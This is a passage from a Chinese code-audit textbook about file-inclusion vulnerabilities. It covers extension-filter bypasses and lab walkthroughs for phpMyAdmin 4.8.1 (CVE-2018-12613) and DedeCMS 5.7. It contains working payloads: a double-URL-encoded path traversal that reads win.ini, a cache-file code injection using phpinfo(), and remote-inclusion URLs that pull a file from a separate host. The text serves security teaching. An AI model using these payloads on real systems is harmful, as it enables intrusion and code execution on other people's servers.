\u8DEF\u5F84\u957F\u5EA6\u7ED5\u8FC7\u662F\u7531\u4E8E\u64CD\u4F5C\u7CFB\u7EDF\u957F\u5EA6\u7684\u9650\u5236\uFF0C\u5C06\u8F93\u5165\u7684\u8DEF\u5F84\u53C2\u6570\u957F\u5EA6\u8D85\u8FC7\u5176\u6700\u5927\u7684\u8DEF\u5F84\u957F\u5EA6\uFF0C\u4ECE\u800C\u4F7F\u7CFB\u7EDF\u65E0\u6CD5\u8BC6\u522B\u540E\u9762\u7684\u6587\u4EF6\u8DEF\u5F84\uFF0C\u5BFC\u81F4\u7ED5\u8FC7\u6269\u5C55\u540D\u8FC7\u6EE4\u3002\r
\r
\u8BE5\u65B9\u6CD5\u7ED5\u8FC7\u6761\u4EF6\u5305\u62EC\uFF1AWindows\u7CFB\u7EDF\u76EE\u5F55\u7684\u6700\u5927\u8DEF\u5F84\u957F\u5EA6\u4E3A256B\uFF0CLinux\u7CFB\u7EDF\u4E0B\u76EE\u5F55\u7684\u6700\u5927\u8DEF\u5F84\u957F\u5EA6\u4E3A4096B\u3002\u7ED5\u8FC7\u7684\u65B9\u5F0F\u53EF\u4EE5\u4F7F\u7528\u591A\u4E2A\u201C/./././././././././././././././\u201D\u6216\u201C\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u2026\u201D\u7684\u65B9\u5F0F\u8D85\u8FC7\u6700\u5927\u76EE\u5F55\u8DEF\u5F84\u957F\u5EA6\u3002\u5728Windows\u7CFB\u7EDF\u4E0B\u9700\u8981240\u4E2A\u8FDE\u7EED\u7684\u201C.\u201D\u6216\u201C./\u201D\u622A\u65AD\uFF0C\u5728Linux\u64CD\u4F5C\u7CFB\u7EDF\u4E0B\u9700\u89812038\u4E2A\u201C./\u201D\u8FDB\u884C\u622A\u65AD\u3002\r
\r
### 7.3.2 \u6269\u5C55\u540D\u8FC7\u6EE4\u7ED5\u8FC7\uFF08\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\uFF09\r
\r
\u5BF9\u4E8E\u9650\u5236\u540E\u7F00\u540D\u7684\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\uFF0C\u901A\u5E38\u5B58\u5728\u4E09\u79CD\u7ED5\u8FC7\u65B9\u6CD5\uFF1A\u95EE\u53F7\u7ED5\u8FC7\uFF08?\uFF09\u3001\u4E95\u53F7\u7ED5\u8FC7\uFF08#\uFF09\u3001\u7A7A\u683C\u7ED5\u8FC7\uFF08 \uFF09\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9\u6B21\u7C7B\u578B\u7ED5\u8FC7\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09  \u95EE\u53F7\u7ED5\u8FC7\r
\r
\u901A\u8FC7\u5728URL\u8DEF\u5F84\u540E\u52A0\u5165\u95EE\u53F7\uFF08?\uFF09\u5E76\u6DFB\u52A0HTML\u5B57\u7B26\u4E32\uFF0C\u95EE\u53F7\u540E\u7684\u6269\u5C55\u540D.html\u5C06\u88AB\u4F5C\u4E3A\u67E5\u8BE2\uFF0C\u4ECE\u800C\u7ED5\u8FC7\u6269\u5C55\u540D\u8FC7\u6EE4\u3002\r
\r
\u6F0F\u6D1E\u4EE3\u7801\u6848\u4F8B\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$filename=$_GET[\u2018filename\u2019];\r
\r
include($filename.\u201D.html\u201D);?>\r
\r
\r
\r
\u8F93\u5165\u8DEF\u5F84\u4E3A\uFF1Ahttp://127.0.0.1/test.php?filename=http://192.168.0.11/1.txt?\u8BF7\u6C42\u540E\u6210\u529F\u6267\u884C1.txt\u6587\u4EF6\uFF0C\u5982\u56FE7-4\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image404.gif)\r
\r
\u56FE7-4 \u95EE\u53F7\u7ED5\u8FC7\u6D4B\u8BD5\u56FE\r
\r
\uFF082\uFF09  \u5176\u4ED6\u7ED5\u8FC7\r
\r
l \u4E95\u53F7\u7ED5\u8FC7\uFF1A\u4E95\u53F7\uFF08#\uFF09\u540E\u6DFB\u52A0HTML\u5B57\u7B26\u4E32\u5C06\u622A\u65AD\u540E\u9762\u7684\u6269\u5C55\u540D.html\u4ECE\u800C\u7ED5\u8FC7\u6269\u5C55\u540D\u8FC7\u6EE4\uFF0C\u5176\u4E2D\u4E95\u53F7\u7684URL\u7F16\u7801\u4E3A%23\u3002\r
\r
\u8F93\u5165\u8DEF\u5F84\u4E3A\uFF1Ahttp://127.0.0.1/include-labs/houzhuiraoguo.php?filename=http://192.168.0.11/1.txt%23\r
\r
l \u7A7A\u683C\u7ED5\u8FC7\uFF1A\u4E0E\u4E0A\u8FF0\u7B26\u53F7\u7ED5\u8FC7\u65B9\u6CD5\u7C7B\u4F3C\uFF0C\u8F93\u5165\u8DEF\u5F84\uFF1Ahttp://127.0.0.1/include-labs/houzhuiraoguo.php?filename=http://192.168.0.11/1.txt%20\u4E5F\u53EF\u7ED5\u8FC7\u6269\u5C55\u540D\u8FC7\u6EE4\u3002\r
\r
## 7.4 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 7.4.1  \u5B9E\u9A8C\uFF1Aphpmyadmin4.8.1\u6587\u4EF6\u5305\u542B\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9phpmyadmin4.8.1\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\u8BE5\u6F0F\u6D1E\u5F71\u54CD\u7684\u7248\u672C\u4E3Aphpmyadmin4.8.0\u81F34.8.1\u7248\u672C\uFF0C\u6F0F\u6D1E\u7F16\u53F7\u4E3ACVE-2018-12613\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80037.1.3\u8282\uFF1A\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\uFF1B7.2\u8282\uFF1A\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6848\u4F8B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1Bphpmyadmin4.8.1\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09 \u5BA1\u8BA1\u9636\u6BB5\r
\r
\`\`\`\r
\u5BF9phpmyadmin\u8FDB\u884C\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5168\u5C40\u641C\u7D22\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u3002\u5168\u5C40\u641C\u7D22include\u51FD\u6570\u5982\u56FE7-5\u6240\u793A\uFF0C\u53EF\u4EE5\u53D1\u73B0\u5728index.php\u6587\u4EF6\u4E2Dinclude\u51FD\u6570\uFF0C\u5BA1\u8BA1\u8BE5\u51FD\u6570\u662F\u5426\u5B58\u5728\u53EF\u63A7\u53C2\u6570\u3002index.php\u6587\u4EF6\u4E2D\u5B58\u5728include $_REQUEST['target']\uFF0C\u53EF\u901A\u8FC7HTTP\u8BF7\u6C42\u4F20\u9012\u53C2\u6570target\u3002\r
\`\`\`\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image406.jpg)\r
\r
\u56FE7-5 \u5168\u5C40\u641C\u7D22include\u51FD\u6570\u56FE\r
\r
\`\`\`\r
\u53CC\u51FBindex.php\u9875\u9762\uFF0C\u5176\u4E2D\u5305\u542Btarget\u53C2\u6570\u53D8\u91CF\uFF0C\u540C\u65F6\u901A\u8FC7\u654F\u611F\u53C2\u6570\u56DE\u6EAF\u6CD5\u5BA1\u8BA1\u8BE5target\u53D8\u91CF\u662F\u5426\u88AB\u8FC7\u6EE4\uFF0C\u901A\u8FC7\u5BA1\u8BA1\u8BE5\u53D8\u91CF\u5728\u4F20\u9012\u8FC7\u7A0B\u5E76\u6CA1\u6709\u4EFB\u4F55\u8FC7\u6EE4\uFF0C\u5176\u4EE3\u7801\u4E3A\uFF1A\r
\`\`\`\r
\r
\r
\r
\`\`\`\r
if (! empty($_REQUEST['target'])\r
&& is_string($_REQUEST['target']) //target\u53C2\u6570\u503C\u4E3A\u7A7A\r
&& ! preg_match('/^index/', $_REQUEST['target'])//\u4E0D\u5339\u914Dindex\u6B63\u5219\u8868\u8FBE\u5F0F\r
&& ! in_array($_REQUEST['target'], $target_blacklist)//\u5728\u9ED1\u540D\u5355\u4E2D\r
&& Core::checkPageValidity($_REQUEST['target'])//target\u53C2\u6570\u662F\u5426\u6709\u6548\u68C0\u9A8C\r
) {\r
include $_REQUEST['target'];\r
exit;}\r
\`\`\`\r
\r
\r
\r
\u76EE\u524D\u6F0F\u6D1E\u5229\u7528\u7684\u5173\u952E\u662F\u80FD\u591F\u7ED5\u8FC7\u4E0A\u8FF0\u4EE3\u7801\u7684if\u5224\u65AD\u3002\u5176\u9996\u5148\u5224\u65ADtarget\u53C2\u6570\u662F\u5426\u4E3A\u5B57\u7B26\u4E32\uFF0C\u518D\u68C0\u6D4Btarget\u4E0D\u80FD\u4EE5index\u5F00\u5934\uFF0C\u518D\u5224\u65ADtarget\u53C2\u6570\u4E0D\u80FD\u5728$target_blacklist\u6570\u7EC4\u91CC\uFF0C$target_blacklist\u6570\u7EC4\u5185\u5BB9\u4E3A\uFF1A\r
\r
\r
\r
\`\`\`\r
$target_blacklist = array (\r
'import.php', 'export.php'//\u9ED1\u540D\u5355\u4E3Aimport.php\u548Cexport.php\u6587\u4EF6\r
);\r
\`\`\`\r
\r
\r
\r
\u524D\u4E09\u4E2A\u6761\u4EF6\u53EF\u4EE5\u8F7B\u677E\u7ED5\u8FC7\uFF0C\u6700\u540E\u9700\u7ED5\u8FC7Core\u7C7B\u4E2D\u7684checkPageValidity\u68C0\u67E5\u3002\u7ED5\u8FC7\u8BE5\u65B9\u6CD5\u68C0\u67E5\u7684\u5173\u952E\u5728\u4E8E\uFF1A\u7A0B\u5E8F\u5BF9\u4F20\u5165\u7684target\u53C2\u6570\u503C\u8FDB\u884C\u4E86url\u89E3\u7801\uFF0C\u53EF\u4EE5\u4F7F\u7528\u4E8C\u6B21URL\u7F16\u7801\u7684\u65B9\u5F0F\u7ED5\u8FC7\u65B9\u6CD5\u68C0\u67E5\uFF0C\u5229\u7528\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u67E5\u770B\u654F\u611F\u6587\u4EF6\uFF0CcheckPageValidity\u51FD\u6570\u4EE3\u7801\u5982\u56FE7-15\u6240\u793A\u3002\r
\r
\r
\r
\`\`\`\r
public static function checkPageValidity(&$page, array $whitelist = [])\r
{\r
if (empty($whitelist)) {//\u82E5$whitelist\u4E3A\u7A7A\u5219\u8D4B\u503C\u4E3A$goto_whitelist\r
$whitelist = self::$goto_whitelist;}\r
if (! isset($page) || !is_string($page)) {/\r
return false;} /\u82E5$page\u672A\u8BBE\u7F6E\u6216\u4E0D\u662Fstring\u5219\u8FD4\u56DEfalse\r
if (in_array($page, $whitelist)) {\r
return true;}//\u82E5$page\u5728$whitelist\u6570\u7EC4\u4E2D\u5219\u8FD4\u56DEtrue\r
$_page = mb_substr($page,0,mb_strpos($page . '?', '?'));//\u622A\u53D6$page\r
if (in_array($_page, $whitelist)) {//\u82E5$_page\u5728$whitelist\u6570\u7EC4\u4E2D\u5219\u8FD4\u56DEtrue\r
return true;}\r
$_page = urldecode($page);//\u5BF9$page\u8FDB\u884CURL\u7F16\u7801\u5E76\u8D4B\u503C\u7ED9$_page\r
$_page = mb_substr($_page,0,mb_strpos($_page . '?', '?'));\r
if (in_array($_page, $whitelist)) {//\u82E5$_page\u5728$whitelist\u6570\u7EC4\u4E2D\u5219\u8FD4\u56DEtrue\r
return true;}\r
return false;}\r
\`\`\`\r
\r
\r
\r
\u81F3\u6B64\u53EF\u4EE5\u770B\u5230\u6F0F\u6D1E\u4EA7\u751F\u7684\u539F\u56E0\u662F\u7531\u4E8Eindex.php\u6587\u4EF6\u4E2D\u7684$page\u53EF\u63A7\u4E14\u8FC7\u6EE4\u4E0D\u4E25\u683C\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u901A\u8FC7\u4E8C\u6B21URL\u7F16\u7801\u65B9\u5F0F\u7ED5\u8FC7\u68C0\u6D4B\u673A\u5236\uFF0C\u4ECE\u800C\u5229\u7528\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\r
\r
\uFF082\uFF09\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5229\u7528\r
\r
\u8BBF\u95EEhttp://ip/phpmyadmin/index.php\uFF0C\u7136\u540E\u8F93\u5165\u7528\u6237\u540Droot\uFF0C\u5BC6\u7801root\uFF0C\u767B\u5F55\u9875\u9762\u3002\u6784\u9020\u653B\u51FB\u8F7D\u8377Payload\u4E3A\uFF1A\r
\r
http://ip/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../windows/win.ini\r
\r
\u5176\u4E2D%253f\u901A\u8FC7URL\u4E8C\u6B21\u89E3\u7801\u540E\uFF0C%253f\u522B\u89E3\u7801\u4E3A\u7B26\u53F7\u201C?\u201D\uFF0C\u4F7F\u7528\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u8BBF\u95EEwin.ini\u6587\u4EF6\u5185\u5BB9\u3002\u653B\u51FB\u6548\u679C\u5982\u56FE7-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image408.jpg)\r
\r
\u56FE7-6 \u653B\u51FB\u6548\u679C\u56FE\r
\r
### 7.4.2  \u5B9E\u9A8C\uFF1A\u7EC7\u68A6cmsV5.7\u5305\u542BCache\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9\u7EC7\u68A6cmsV5.7\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\u8BE5CMS\u7684sys_verifies.php\u6587\u4EF6\u4E2D\u4F7F\u7528require_once\u51FD\u6570\u8FDB\u884C\u6587\u4EF6\u5305\u542B\uFF0C\u540C\u65F6\u5305\u542B\u7684Cache\u6587\u4EF6\u53EF\u88AB\u653B\u51FB\u8005\u8FDB\u884C\u4FEE\u6539\u4ECE\u800C\u6267\u884C\u6076\u610F\u4EE3\u7801\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80037.1.3\u8282\uFF1A\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\uFF1B7.2\u8282\uFF1A\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6848\u4F8B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B\u7EC7\u68A6CMS V5.7\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\`\`\`\r
\u5BF9\u7EC7\u68A6CMS5.7\u8FDB\u884C\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u641C\u7D22sys_vertifies.php\u4E2D\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570require_once\u3002\u53EF\u4EE5\u53D1\u73B0\u8BE5\u7A0B\u5E8F210\u884C\u4F7F\u7528require_once\u5305\u542B\u7F13\u5B58\u6587\u4EF6$cacheFiles\uFF0C\u5F53\u4F20\u9012\u53C2\u6570\u4E3Adown\u65F6\uFF0C\u5C06\u5305\u542B\u6587\u4EF6datat/modifytmp.inc\uFF0C\u4EE3\u7801\u4E3A\uFF1A\r
\r
else if($action=='down')                    //\u5F53$action\u4E3Adown\u65F6\r
{\r
$cacheFiles = DEDEDATA.'/modifytmp.inc';\r
require_once($cacheFiles);              //\u6587\u4EF6\u5305\u542Bmodifytmp.inc\r
if($fileConut==-1 || $curfile > $fileConut)\r
{ShowMsg("\u5DF2\u4E0B\u8F7D\u6240\u6709\u6587\u4EF6<br /><a href='sys_verifies.php?action=apply'>[\u76F4\u63A5\u66FF\u6362\u6587\u4EF6]</a> &nbsp; <a href='#'>[\u6211\u81EA\u5DF1\u624B\u52A8\u66FF\u6362\u6587\u4EF6]</a>","javascript:;");\r
exit();}\r
\u2026\u7701\u7565\u2026\r
}\r
else if ($action == 'getfiles')             //\u5F53$action\u4E3A'getfiles'\u65F6\r
{    if(!isset($refiles))\r
{   ShowMsg("\u4F60\u6CA1\u8FDB\u884C\u4EFB\u4F55\u64CD\u4F5C\uFF01","sys_verifies.php");\r
exit();}\r
$cacheFiles = DEDEDATA.'/modifytmp.inc';//\u5B9A\u4E49\u5199\u5165\u6587\u4EF6\u540D\u4E3Amodifytmp.inc\r
$fp = fopen($cacheFiles, 'w');          //\u5F00\u542F\u6587\u4EF6\u4E14\u6709\u5199\u6743\u9650\r
fwrite($fp, '<'.'?php'."\\r\\n");         //\u5199\u5165\u5185\u5BB9\r
fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\\r\\n");//\u5199\u5165\u5185\u5BB9\r
$dirs = array();\r
$i = -1;\r
$adminDir = preg_replace("#(.*)[\\/\\\\\\\\]#", "", dirname(__FILE__));\r
foreach($refiles as $filename)         //\u904D\u5386$refiles\u53D8\u91CF\r
{   $filename = substr($filename,3,strlen($filename)-3);//\u622A\u53D6\u6587\u4EF6\u540D\r
if(preg_match("#^dede/#i", $filename)) //\u5982\u679C\u5339\u914D\u6B63\u5219\u8868\u8FBE\u5F0F#^dede/#i\r
{$curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) );//\u66FF\u6362\u5B57\u7B26\u4E32\r
} else {\r
$curdir = GetDirName($filename);//\u5426\u5219\u76F4\u63A5\u83B7\u53D6\u6587\u4EF6\u540D}\r
if( !isset($dirs[$curdir]) ) {//\u5982\u679C$dirs[$curdir]\u672A\u8BBE\u7F6E\r
$dirs[$curdir] = TestIsFileDir($curdir);}//\u5219\u8C03\u7528TestIsFileDir\u51FD\u6570\r
$i++;\r
fwrite($fp, '$files['.$i.'] = "'.$filename.'";'."\\r\\n");}\r
//\u5411modifytmp.inc\u6587\u4EF6\u4E2D\u5199\u5165\u6587\u4EF6\r
fwrite($fp, '?'.'>');\r
fclose($fp);//\u5173\u95ED\u6D41\r
\u2026\u7701\u7565\u2026\r
\r
\u867D\u7136\u4E0A\u8FF0\u4EE3\u7801\u5305\u542B\u6587\u4EF6\u7684\u540D\u79F0\u65E0\u6CD5\u63A7\u5236\uFF0C\u4F46\u662F\u53EF\u4EE5\u67E5\u770B\u6587\u4EF6modifytmp.inc\u80FD\u591F\u88AB\u5199\u5165\u6076\u610F\u4EE3\u7801\u3002\u82E5\u53EF\u88AB\u5199\u5165\uFF0C\u5219\u53EF\u4EE5\u901A\u8FC7\u5305\u542B\u6F0F\u6D1E\u6267\u884C\u8BE5\u6587\u4EF6\u6076\u610F\u4EE3\u7801\u3002\u5F53$action\u4E3Agetfiles\u65F6\uFF0C\u7A0B\u5E8F\u5C06\u5411modifytmp.inc\u6587\u4EF6\u4E2D\u5199\u5165\u5185\u5BB9\uFF0C\u5176\u5185\u5BB9\u662Furl\u4E2D\u8FC7\u53BB\u7684refiles\u53C2\u6570\u4E14\u8BE5\u53C2\u6570\u5C06\u662F\u4E00\u4E2A\u6570\u7EC4\u3002\u4F7F\u7528foreach\u51FD\u6570\u904D\u5386\u8BE5\u6570\u7EC4\u5E76\u5199\u5165modifytmp.inc\u4E2D\u3002\r
\u5982\u679C\u8981\u5199\u5165\u6587\u4EF6\u5185\u5BB9\u8FD8\u9700\u8981\u6EE1\u8DB3\u6761\u4EF6\u662F\uFF1A\r
l  \u7ED5\u8FC7preg_match("#^dede/#i",$filename)\uFF1B\r
l  \u7ED5\u8FC7TestisFileDir\u51FD\u6570\uFF1B\r
l  \u6267\u884Cfwrite($fp,'$files['.$i.']="'.$filename.'";'."\\r\\n")\u5373\u53EF\u3002\r
\`\`\`\r
\r
\uFF082\uFF09  \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5229\u7528\r
\r
\u767B\u9646\u7EC7\u68A6\u7BA1\u7406\u5458\u540E\u53F0\uFF0C\u7528\u6237\u540D\u5BC6\u7801\u5747\u4E3Aadmin\uFF0CURL\u4E3A\uFF1Ahttp://ip/dedevms57/login.php\u3002\u5982\u56FE7-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image410.jpg)\r
\r
\u56FE7-7 \u7BA1\u7406\u5458\u540E\u53F0\u767B\u5F55\u9875\u9762\r
\r
\u8F93\u5165\u6784\u9020\u7684Payload\uFF1Ahttp://ip /dedecms57/dede/sys_verifies.php?action=getfiles&refiles[]=\\";phpinfo();//\u5411modifytmp.inc\u6587\u4EF6\u4E2D\u5199\u5165\u6076\u610F\u811A\u672C\uFF0C\u8BBF\u95EE\u6210\u529F\u540E\u67E5\u770B\u8BE5\u6587\u4EF6\u662F\u5426\u5199\u5165\u6076\u610F\u811A\u672C\uFF0C\u5982\u56FE7-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image412.jpg)\r
\r
\u56FE7-8 \u6076\u610F\u4EE3\u7801\u5199\u5165\u56FE\r
\r
\u5F53$action\u4E3Adown\u65F6\u5C06\u6587\u4EF6\u5305\u542Bmodifytmp.inc\u6587\u4EF6\uFF0C\u5E76\u6267\u884C\u6076\u610F\u4EE3\u7801\u3002\u8F93\u5165\u7684URL\u8DEF\u5F84\u4E3A\uFF1Ahttp://ip/dedecms57/dede/sys_verifies.php?action=down&curfile=1\uFF0C\u8BBF\u95EE\u5373\u901A\u8FC7\u5982\u56FE7-9\u6240\u793A\uFF0C\u6210\u529F\u89E6\u53D1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image414.gif)\r
\r
\u56FE7-9 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6D4B\u8BD5\u56FE\r
\r
## 7.5 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u5BF9\u5E38\u89C1\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u5217\u4E3E\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684\u5BA1\u8BA1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u65B9\u6CD5\u3002\u4E0E\u6B64\u540C\u65F6\uFF0C\u7ED9\u51FA\u5B58\u5728\u6F0F\u6D1E\u7684CMS\u5BA1\u8BA1\u6D41\u7A0B\uFF0C\u5305\u62EC\uFF1Aphpmyadmin\u548C\u7EC7\u68A6CMS\u3002\u672C\u5355\u5143\u8981\u6C42\u8BFB\u8005\u7740\u91CD\u638C\u63E1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u51FD\u6570\u7684PHP\u4EE3\u7801\u5F62\u5F0F\uFF0C\u5E76\u901A\u8FC7\u5BF9\u5C0F\u578BCMS\u7684\u4EE3\u7801\u8D70\u8BFB\u5BA1\u8BA1\u4EE3\u7801\u5176\u4E2D\u5B58\u5728\u7684\u6F0F\u6D1E\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51438 \u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u4E94\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECD\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF0C\u5305\u62EC\uFF1A\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7684\u57FA\u672C\u77E5\u8BC6\u3001\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\u7684\u4EE3\u7801\u5206\u6790\u53CA\u5BA1\u8BA1\u65B9\u6CD5\u3001FineCMS\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECD\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF0C\u5305\u62EC\uFF1A\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u57FA\u672C\u77E5\u8BC6\u3001\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u53CA\u6316\u6398\u7ECF\u9A8C\u300174CMS 3.0\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF0C\u5305\u62EC\uFF1A\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u7684\u57FA\u672C\u77E5\u8BC6\u3001\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\u7684\u57FA\u672C\u77E5\u8BC6\u3001\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u6F0F\u6D1E\u7684\u4EE3\u7801\u5BA1\u8BA1\u53CA\u6316\u6398\u7ECF\u9A8C\u3001MetInfo6.0\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4ECB\u7ECD\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF0C\u5305\u62EC\uFF1A\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u57FA\u672C\u77E5\u8BC6\u3001\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u3001\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u7684\u4EE3\u7801\u5BA1\u8BA1\u53CA\u6316\u6398\u7ECF\u9A8C\u300174CMS 3.0\u6587\u4EF6\u5220\u9664\u6F0F\u6D1E\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u4E94\u90E8\u5206\u4ECB\u7ECD\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\uFF0C\u5305\u62EC\uFF1A\u901A\u7528\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u9632\u5FA1\u3001\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
**\u5355\u5143\u6784\u56FE**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image416.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u638C\u63E1\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\2.  \u638C\u63E1\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\3.  \u638C\u63E1\u6587\u4EF6\u8BFB\u53D6\uFF08\u4E0B\u8F7D\uFF09\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
